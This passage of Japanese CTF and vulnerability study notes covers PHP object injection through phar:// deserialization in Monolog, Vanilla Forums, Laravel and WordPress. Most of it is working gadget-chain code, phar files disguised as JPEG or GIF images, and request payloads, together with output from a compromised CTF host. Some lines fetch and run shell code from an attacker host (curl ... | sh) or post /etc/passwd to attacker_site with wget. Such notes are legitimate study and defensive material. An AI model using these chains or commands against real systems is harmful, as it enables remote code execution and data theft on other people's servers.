sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
orange:x:1001:1001:,,,:/home/orange:/bin/bash
```
以下で`000-default.conf`を読みだしてWebrootを確認すると`/var/www/html`であることがわかる。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/apache2/sites-enabled/000-default.conf
```
```txt
<VirtualHost *:80>
	...

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	...
</VirtualHost>
```
このWebサイトの機能として、アクセスした先のbodyの内容を`body.cache`に格納してくれるので、`phar`の内容を書き込んで`phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(URL)/body.cache`として読み込めば`unserialize`されてRCEできる！  
コマンドの実行結果は`?url=`で指定するIPに送信できる！  
したがって、攻撃者の用意したサーバー上に`exploit.phar`を用意してそこにアクセスさせれば、`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に`exploit.phar`の内容が書き込まれて、それを`phar://`で読み込んでRCEする！  
pharには有名はMonologのPOPガジェットが使えるらしい。  
これを実行するいは`/etc/php/7.2/cli/php.ini`で`;phar.readonly = On`を`phar.readonly = Off`にする必要がある。`/etc/php/7.2/apache2/php.ini`の方じゃないので注意。  
これを`$php make-explot-phar.php`で実行する。  
```php
<?php

namespace Monolog\Handler
{
    class SyslogUdpHandler
    {
        protected $socket;
        function __construct($x)
        {
            $this->socket = $x;
        }
    }
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;
        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }
}

namespace{
    $cmd = "ls -alt";

    $obj = new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', 'system'],
            [$cmd, 'level' => null]
        )
    );

    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($obj);
    $phar->stopBuffering();

}
```
作成された`exploit.phar`は以下の通り。  
```txt
$ cat exploit.phar
<?php __HALT_COMPILER(); ?>
pO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:7:"ls -alt";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}test;a`~ؤtestX
j{>ңLە"GBMB
```
ちなみにPHPGCCのコマンドを使って作成した場合は以下の通りとなった。  
```txt
$ ./phpggc -p phar -o exploit-monolog1.phar monolog/rce1 system id
$ cat exploit-monolog1.phar
<?php __HALT_COMPILER(); ?>
fO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}dummye`~ؤtest.txte`~ؤtesttest+eE㦶#h)z'GBMB
```
- **payload**  
まず以下でexplot.pharの内容を`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`に書き込む  
```txt
GET http://13.230.134.135/?url=http://IP/exploit.phar
```
次に`phar://`で読み込んでRCEする。実行結果は`?url=`に送信される。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
```
```txt
total 104
drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
-rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
drwx------   5 root root  4096 Oct 18 17:12 root
drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
-r--------   1 root root    54 Oct 15 19:49 flag
drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
```
## phar / file_exists (Berg's Club)
https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club  
- **entrypoint**  
JPEG画像をアップロードできるWebサイトがある。また、画像をシェアできる機能がある。  
```txt
http://200.136.252.42/share/uploads%2Fb7a41ed641bf590cec346e0bdede04a8.jpg
```
`/share/`以降でローカルファイルを指定しており、`http://200.136.252.42/share/%2fetc%2fpasswd`でエラーがでないので`file_exists`で読み込んでいると推測。`/etc`でも同様の結果となるため`file_exists`が使われていると推測するらしい。  
JPEG画像じゃないとアップロードできないらしいので、PHARファイルをJPEGに偽装してアップロードして`/share/`から読み込む。  
PHPGCCの`gadgetchains/Monolog/RCE/1/chain.php`をJPEG用に`setStub`でJPEG用のヘッダーをセットして偽装するように修正する。  
```php
<?php

namespace GadgetChain\Monolog;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.18 <= 1.23';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {   
        $a = new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                ['curl "240.240.240.240:1234" | sh', 'level' => null]
            )
        );
        unlink('pwn.phar');
        $p = new \Phar('pwn.phar', 0); 
        $p['file.txt'] = 'test';
        $p->setMetadata($a);
        $p->setStub("\xff\xd8\xff\xe0\x0a<?php __HALT_COMPILER(); ?>");
        return $a; 
    }   
}
```
これで`http://200.136.252.42/share/phar%3a%2f%2fIMAGE_PATH`でRCEできる！  
- **payload**  
```txt
http://200.136.252.42/share/phar%3a%2f%2fIMAGE_PATH
```
## "phar://" / getimagesize (Vanilla Forums domGetImagesgetimagesize)
https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html  
- **entrypoint**  
`library/core/functions.general.php`の`DashboardController`にユーザー定義の関数`fetchPageInfo`があり、名前から察するに指定した`$url`にリクエストを出してくれるっぽい。  
これだけでもすでにSSRFの脆弱性だが…  
`library/core/functions.general.php`  
`$pageHtml = $request->request([`でリクエストを送信できる！これだけでも多分良くない。  
`$images = domGetImages($dom, $url); `でリクエストから返ってきたデータ(html)を解析して`<img`要素の画像関連の情報を取得するっぽい。  
```php
class ImportController extends DashboardController {

    ...

    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {      // 0
        $pageInfo = [
            'Url' => $url,
            'Title' => '',
            'Description' => '',
            'Images' => [],
            'Exception' => false
        ];

        try {

            ...

            $request = new ProxyRequest();
            $pageHtml = $request->request([
                'URL' => $url,
                'Timeout' => $timeout,
                'Cookies' => $sendCookies,
                'Redirects' => true,
            ]);                                                                                    // 1

            if (!$request->status()) {
                throw new Exception('Couldn\'t connect to host.', 400);
            }

            $dom = pQuery::parseStr($pageHtml);                                                    // 2
            if (!$dom) {
                throw new Exception('Failed to load page for parsing.');
            }

            ...

            // Page Images
            if (count($pageInfo['Images']) == 0) {
                $images = domGetImages($dom, $url);                                                // 3
                $pageInfo['Images'] = array_values($images);
            }
```
`domGetImages`関数の中身を見る。  
`absoluteSource`というユーザー定義の関数で`<img src=`の値を取得していると考えられる。  
```php
    function domGetImages($dom, $url, $maxImages = 4) {
        $images = [];
        foreach ($dom->query('img') as $element) {                                      // 4
            $images[] = [
                'Src' => absoluteSource($element->attr('src'), $url),                   // 5
                'Width' => $element->attr('width'),
                'Height' => $element->attr('height'),
            ];
        }

        ...
```
実際、`<img src=`の値がちゃんとURLの形式になっているのかどうかを`parse_url`で確認している。  
攻撃者によってコントロール可能な文字列が`parse_url`に入っているけどこれは脆弱性ではないっぽい？？  
```php
   function absoluteSource($srcPath, $url) {
        // If there is a scheme in the srcpath already, just return it.
        if (!is_null(parse_url($srcPath, PHP_URL_SCHEME))) {                    // 6
            return $srcPath;                                                    // 7
        }

    ...

    }
```
次に、`domGetImages`の続きを見ると、`$image = $imageInfo['Src'];`,`getimagesize($image); `で攻撃者によって制御可能な文字列が`getimagesize`に入る！  
したがって、ここに`phar://.../exploit.phar`を指定すればRCEできる！  
Vanillaで使える`Gdn_Configuration`を使ったPOPgadgetを使ってRCEできるらしい。  
```php
    function domGetImages($dom, $url, $maxImages = 4) {

        ...

        // Sort by size, biggest one first
        $imageSort = [];
        // Only look at first 4 images (speed!)
        $i = 0;
        foreach ($images as $imageInfo) {
            $image = $imageInfo['Src'];                                                 // 8

            if (strpos($image, 'doubleclick.') != false) {
                continue;
            }

            try {
                if ($imageInfo['Height'] && $imageInfo['Width']) {
                    $height = $imageInfo['Height'];
                    $width = $imageInfo['Width'];
                } else {
                    list($width, $height) = getimagesize($image);                       // 9
                }
```
以下で`poc.jpg`を作成する。  
これを何らかの方法で対象にアプロードして、そのパスも特定しておく。  
```php
// custom pop chain
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}

// create new Phar
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
```
攻撃サーバーに以下のコンテンツを用意しておいて、  
```txt
<html><body><img src="phar:///var/www/html/uploads/6O51ZT69P0S4.jpg">a</img></body></html>
```
以下でこの攻撃者サーバーにアクセスさせればRCE！  
```txt
http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f
```
## phar with GIF / %00lambda_1 / file_get_contents (hitcon2017 Baby^H Master PHP 2017)
https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017  
https://rdot.org/forum/showthread.php?t=4379  
- **entrypoint**  
`$data = $_COOKIE["session-data"];`,`unserialize($data);`が一見脆弱っぽいが、`if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)`で`$data`の署名を検証しているので改竄は無理。  
`$mode = $_GET["m"];`で`?m=upload`と`?m=show`の二つの機能がある。  
`upload`関数には`file_get_contents($_GET["url"] . "/avatar.gif");`で任意のURLのコンテンツを取得して`/var/www/data/md5("orange".$_SERVER["REMOTE_ADDR"])`に保存している。  
`show`関数には`if ( !file_exists($path . "/avatar.gif") )`でそのパスのファイルを読み込んでいる。  
```php
 <?php
    $FLAG    = create_function("", 'die(`/read_flag`);');
    $SECRET  = `/read_secret`;
    $SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($SANDBOX);
    @chdir($SANDBOX);

    if (!isset($_COOKIE["session-data"])) {
        $data = serialize(new User($SANDBOX));
        $hmac = hash_hmac("sha1", $data, $SECRET);
        setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
    }

    class User {
        public $avatar;
        function __construct($path) {
            $this->avatar = $path;
        }
    }

    class Admin extends User {
        function __destruct(){
            $random = bin2hex(openssl_random_pseudo_bytes(32));
            eval("function my_function_$random() {"
                ."  global \$FLAG; \$FLAG();"
                ."}");
            $_GET["lucky"]();
        }
    }

    function check_session() {
        global $SECRET;
        $data = $_COOKIE["session-data"];
        list($data, $hmac) = explode("-----", $data, 2);
        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))
            die("Bye");
        if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) )
            die("Bye Bye");

        $data = unserialize($data);
        if ( !isset($data->avatar) )
            die("Bye Bye Bye");
        return $data->avatar;
    }

    function upload($path) {
        $data = file_get_contents($_GET["url"] . "/avatar.gif");
        if (substr($data, 0, 6) !== "GIF89a")
            die("Fuck off");
        file_put_contents($path . "/avatar.gif", $data);
        die("Upload OK");
    }

    function show($path) {
        if ( !file_exists($path . "/avatar.gif") )
            $path = "/var/www/html";
        header("Content-Type: image/gif");
        die(file_get_contents($path . "/avatar.gif"));
    }

    $mode = $_GET["m"];
    if ($mode == "upload")
        upload(check_session());
    else if ($mode == "show")
        show(check_session());
    else
        highlight_file(__FILE__);
```
したがって、`upload`関数で`?url=http://attacker/avatar.gif`としてpharファイルをGIFに偽装してアップロードしておき、また`upload`関数を呼びだすことでこのパスを`?url=phar:///var/www/data/md5("orange".$_SERVER["REMOTE_ADDR"])/avatar.gif`でPHARファイルとして読み込めばRCEのやつができる！  
`show`でも`if ( !file_exists($path . "/avatar.gif") )`で読み込めそうだが、`$path`は制御できず`phar://`とすることはできないためここでは使えない。  
Adminクラスには明らかにObject Injectionに使ってくださいと言わんばかりの`__destruct()`がある。  
以下で`__desturuct`さえ呼びだせればよいのでこれでいい。  
```txt
$ cat avatar.gif
GIF89a<?php __HALT_COMPILER(); ?>
W O:5:"Admin":1:{s:2:"ip";s:0:"";}   index.pheQFƁ<?php ?>=)Ʀ0*?KbaQGBMB
```
`my_function_$random`を呼び出すことができればFlagが表示されるっぽいが、`$random`の値を推測することができない…  
`$_GET["lucky"]();`もあるが、ここで、``$FLAG    = create_function("", 'die(`/read_flag`);');``でラムダ関数が定義されていることを利用して、`"\x00lambda_1"();`で同じものを実行できる！  
  
あと、WriteupにはApache Preforkがどうのこうの書いてるけどよくわからん…  
新規子プロセスをApacheにforkさせる意味はなんだろうか？？  
`"\x00lambda_1"();`の数字を`1`と推測するためかな？？？？  
- **payload**  
```txt
# get a cookie
$ curl http://host/ --cookie-jar cookie

# download .phar file from http://orange.tw/avatar.gif
$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'

# force apache to fork new process
$ python fork.py &

# get flag
$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```
## Laravel / encrypt gadget in session with APP_KEY / alias traversal (Forgotten Task)
https://github.com/BlackFan/ctfs/tree/master/volgactf_2018_quals/forgotten_task  
- **entrypoint**  
`http://forgotten-task.quals.2018.volgactf.ru/laravel../.env`でalias traversalという手法が使えるらしい。どうやらサーバー側でのaliasの設定が良くないっぽい？(`/i/`を`/data/w3/images/`に変換するエイリアスで、`/i../`を`/data/w3/`と変換するミス？)  
https://qiita.com/no1zy_sec/items/e541f1c838874ff400bb  
ここにわかりやすい説明かいてた。  
これでLaravelのAPP_KEYを取得してセッションデータをヤバいやつにAPP_KEYで署名する以下のスクリプトを実行するらしい。  
よくわからん  
```txt
php laravel_attack.php base64:BTyS9a35xfMVYrNkvo8j0MClde4Jk6Tl/e+/+UCEyWA= "file_get_contents('http://attacker_site/rce_test');"
```
- **payload**  
```python
<?php
    /* Unserialize Chain */
    /* See also https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/1 */

        namespace Illuminate\Broadcasting {
            class PendingBroadcast {
                protected $events;
                protected $event;

                function __construct($events, $cmd) {
                    $this->events = $events;
                    $this->event = $cmd;
                }
            }
        }


        namespace Illuminate\Events {
            class Dispatcher {
                protected $listeners;

                function __construct($cmd) {
                    $this->listeners = [
                        $cmd => ['assert']
                    ];
                }
            }
        }

        namespace {

            function generateChain($code) {
                return serialize(new \Illuminate\Broadcasting\PendingBroadcast(new \Illuminate\Events\Dispatcher($code), $code));
            }

    /* // Unserialize Chain */

    /* Laravel Encryptor */

            function encrypt($value, $serialize = false) {
                global $cipher, $key;
                $iv = random_bytes(openssl_cipher_iv_length($cipher));
                $value = openssl_encrypt(
                    $serialize ? serialize($value) : $value,
                    $cipher, $key, 0, $iv
                );
                $iv = base64_encode($iv);
                $mac = hash_hmac('sha256', $iv.$value, $key);
                $json = json_encode(compact('iv', 'value', 'mac'));
                return base64_encode($json);
            }

            function decrypt($payload, $unserialize = false) {
                global $cipher, $key;
                $payload = json_decode(base64_decode($payload), true);
                $iv = base64_decode($payload['iv']);
                $decrypted = openssl_decrypt(
                    $payload['value'], $cipher, $key, 0, $iv
                );
                return $unserialize ? unserialize($decrypted) : $decrypted;
            }

    /* // Laravel Encryptor */

            $cipher = 'AES-256-CBC';
            $key = isset($argv[1]) ? $argv[1] : 'ABCDEF1234567890ABCDEF1234567890';
            $cmd = isset($argv[2]) ? $argv[2] : "system('wget --post-data \"`cat /etc/passwd`\" https://attacker_site/');";
            
            if (substr($key, 0, 7) == 'base64:') {
                $key = base64_decode(substr($key, 7));
            }
            
            echo 'Cookie: volgactf_task_session='.encrypt(generateChain($cmd));
        }
```
## WordPress < 3.6.1 (is_serialized()) PHP Object Injection
- 概要   
wordpressではユーザーのメタデータ(名前とかの情報)をシリアライズしたりしなかったりしてデータベースに保存する。そのため、メタデータを取得するときには`unserialize`するべきデータとするべきではないデータ(そもそもシリアル化されてないデータ)の2種類存在するので、`unserialize`したりしなかったりする必要がある。   
ここで、じゃあ入力に`i:1;`を入れれば、このままデータベースに保存されて、データベースから取り出すときに`unserialize`されて`1`を取得するのでは？って思うがそうはならない。入力が`i:1;`の場合、`is_serialized()`でシリアル化されたデータと判断して、さらにもう一回シリアライズして`s:4:"i:1;";`としてデータベースに保存する。   
これによって一応シリアライズされたデータを挿入しても`unserialize`しないようになっている。   
しかし、その「データがシリアル化されているかどうか」を判断する`is_serialized()`メソッドで、`i:1;𝌆`という文字列の場合、最後が`;`,`}`で終わっていないのでシリアル化されているとはみなさずにこのままデータベースに保存しようとするが、MySQLではこの`𝌆`というUnicode文字列を扱えないので捨てられて`i:1;`として保存されてしまう。   
これによってデータベースから取り出すときにシリアライズされたデータとみなして`unserialize`されてしまう！   
つまり、`O:4:"Test":{...}𝌆`的なPayloadをユーザーのメタデータとして登録すれば、そのデータを取り出すときに`unserialize`されてRCEできるかも！ってこと。   
- 例   
メタデータをデータベースから取得する`get_metadata()`は以下をする。   
```php
if ( isset($meta_cache[$meta_key]) ) {
    if ( $single )
        return maybe_unserialize( $meta_cache[$meta_key][0] );
    else
        return array_map('maybe_unserialize', $meta_cache[$meta_key]);
}
```
`maybe_unserialize`は以下の通りでシリアライズされたデータなら`unserialize`、そうでないならそのまま返す。   
```php
function maybe_unserialize( $original ) {
    if ( is_serialized( $original ) ) // don't attempt to unserialize data that wasn't serialized going in
        return @unserialize( $original );
    return $original;
}
```
`is_serialized()`は以下の通りで、シリアライズされたデータかどうか判断している。   
```php
function is_serialized( $data ) {
    // if it isn't a string, it isn't serialized
    if ( ! is_string( $data ) )
        return false;
    $data = trim( $data );
     if ( 'N;' == $data )
        return true;
    $length = strlen( $data );
    if ( $length < 4 )
        return false;
    if ( ':' !== $data[1] )
        return false;
    $lastc = $data[$length-1];
    if ( ';' !== $lastc && '}' !== $lastc )
        return false;
    $token = $data[0];
    switch ( $token ) {
        case 's' :
            if ( '"' !== $data[$length-2] )
                return false;
        case 'a' :
        case 'O' :
            return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
        case 'b' :
        case 'i' :
        case 'd' :
            return (bool) preg_match( "/^{$token}:[0-9.E-]+;\$/", $data );
    }
    return false;
}
```
メタデータを更新する`update_metadata()`は以下の通り。   
```php
// …
    $meta_value = wp_unslash($meta_value);
    $meta_value = sanitize_meta( $meta_key, $meta_value, $meta_type );
// …
    $meta_value = maybe_serialize( $meta_value );
    
    $data  = compact( 'meta_value' );
// …
    $wpdb->update( $table, $data, $where );
// …
```
`maybe_serialize`は以下の通り。   
```php
function maybe_serialize( $data ) {
    if ( is_array( $data ) || is_object( $data ) )
        return serialize( $data );

    // Double serialization is required for backward compatibility.
    // See http://core.trac.wordpress.org/ticket/12930
    if ( is_serialized( $data ) )
        return serialize( $data );

    return $data;
}
```
- 発見方法   
`unserialize`が呼ばれている箇所を特定して、どういうデータがそこに呼ばれているのかを確認する？   
- 対策   
`$strict`が追加されてる。最後の文字が`;`,`}`かどうかでチェックしないようになっているらしい。   
```php
function is_serialized( $data, $strict = true ) {
     // if it isn't a string, it isn't serialized
     if ( ! is_string( $data ) )
         return false;
     if ( ':' !== $data[1] )
         return false;
    if ( $strict ) {
        $lastc = $data[ $length - 1 ];
        if ( ';' !== $lastc && '}' !== $lastc )
            return false;
    } else {
        // ensures ; or } exists but is not in the first X chars
        if ( strpos( $data, ';' ) < 3 && strpos( $data, '}' ) < 4 )
            return false;
    }
     $token = $data[0];
     switch ( $token ) {
         case 's' :
            if ( $strict ) {
                if ( '"' !== $data[ $length - 2 ] )
                    return false;
            } elseif ( false === strpos( $data, '"' ) ) {
                 return false;
            }
         case 'a' :
         case 'O' :
             return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
         case 'b' :
         case 'i' :
         case 'd' :
            $end = $strict ? '$' : '';
            return (bool) preg_match( "/^{$token}:[0-9.E-]+;$end/", $data );
     }
     return false;
 }
```
- 参考資料   
https://tom.vg/2013/09/wordpress-php-object-injection/   
## Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability
- 概要   
AuthenticatedなAdminユーザーがPOSTの`Garden-dot-TouchIcon`パラメータの値にシリアライズした文字列を設定すると、`unserialize`まで到達してRCEができる。   
- 例   
`c('Garden.TouchIcon')`は`config($_POST['Garden-dot-TouchIcon'])`的な動作をするらしい。`c`関数は`config`関数のマクロらしい。config関数は`library/core/functions.general.php`で定義されている。      
```php
class Gdn_Controller extends Gdn_Pluggable {

    ...

    public function renderMaster() {
        // Build the master view if necessary
        if (in_array($this->_DeliveryType, [DELIVERY_TYPE_ALL])) {

        ...

            $touchIcon = c('Garden.TouchIcon');                                     // 1
            if ($touchIcon) {
                $this->Head->setTouchIcon(Gdn_Upload::url($touchIcon));
            }
```
この`config`メソッドが呼び出されてるっぽい？   
この中でさらに`Gdn::config`(Gndクラスで定義されたconfigメソッド)が呼ばれてる。   
```php
if (!function_exists('config')) {
    /**
     * Retrieves a configuration setting.
     *
     * @param string|bool $name The name of the configuration setting.
     * Settings in different sections are separated by dots.
     * @param mixed $default The result to return if the configuration setting is not found.
     * @return mixed The configuration setting.
     * @see Gdn::config()
     */
    function config($name = false, $default = false) {                              // 2
        return Gdn::config($name, $default);
    }
}
```
中で`get`メソッドが呼ばれている。ここまででPOSTで入力したデータは`$name`にある？   
```php
class Gdn {

    ...

    /**
     * Get a configuration setting for the application.
     *
     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')
     * @param mixed $default The result to return if the configuration setting is not found.
     * @return Gdn_Configuration|mixed The configuration setting.
     */
    public static function config($name = false, $default = false) {
        if (self::$_Config === null) {
            self::$_Config = static::getContainer()->get(self::AliasConfig);
        }
        $config = self::$_Config;
        if ($name === false) {
            $result = $config;
        } else {
            $result = $config->get($name, $default);        // 3
        }

        return $result;
    }
```
ここで`Gdn_Format::unserialize($value);`でユーザーの入力が`Gdn_Format`クラスで定義された`unserialize`メソッドに入力されているらしい…。でも`$name`が`$value`に代入されてる様子もないし…。なんで`$name`から`$value`に入力が移ってるのか不明…。   
この`unserialize`はユーザーが定義したものでデフォルトではないのでその定義を確認する。   
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    public function get($name, $defaultValue = false) {
        // Shortcut, get the whole config
        if ($name == '.') {
            return $this->Data;
        }

        $keys = explode('.', $name);
        // If splitting is off, HANDLE IT
        if (!$this->splitting) {
//         $FirstKey = getValue(0, $Keys);
            $firstKey = $keys[0];
            if ($firstKey == $this->defaultGroup) {
                $keys = [array_shift($keys), implode('.', $keys)];
            } else {
                $keys = [$name];
            }
        }
        $keyCount = count($keys);

        $value = $this->Data;
        for ($i = 0; $i < $keyCount; ++$i) {
            if (is_array($value) && array_key_exists($keys[$i], $value)) {
                $value = $value[$keys[$i]];
            } else {
                return $defaultValue;
            }
        }

        if (is_string($value)) {
            $result = Gdn_Format::unserialize($value);                          // 4
        } else {
            $result = $value;
        }

        return $result;
    }
```
中でデフォルトの`unserialize`が実行されている。   
```php
class Gdn_Format {

    ...

    /**
     * Takes a serialized variable and unserializes it back into its original state.
     * 
     * @param string $serializedString A json or php serialized string to be unserialized.
     * @return mixed
     */
    public static function unserialize($serializedString) {
        $result = $serializedString;

        if (is_string($serializedString)) {
            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {
                $result = unserialize($serializedString);                          // 5
            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {
                $result = json_decode(substr($serializedString, 4), false);
            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {
                $result = json_decode(substr($serializedString, 4), true);
            }
        }
        return $result;
    }
```
- 発見方法   
`unserialize`が呼び出されている場所を特定して、そのメソッドがどこで呼ばれているのかを確認する。そうやってたどっていってユーザーの入力があればOK?って感じ？   
- 対策   
ユーザーの入力を`unserialize`に入れてはいけない。   
- 参考資料   
https://hackerone.com/reports/407552   
## Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution
- 概要   
認証された管理者ユーザーは、シリアル化されたペイロードをpharアーカイブに挿入し、保護されていないfile_exists（）を介してそのペイロードへの読み取りアクセスをトリガーできます。攻撃者はこれを利用して、信頼できないデータを逆シリアル化し、リモートでコードが実行される可能性があります。   
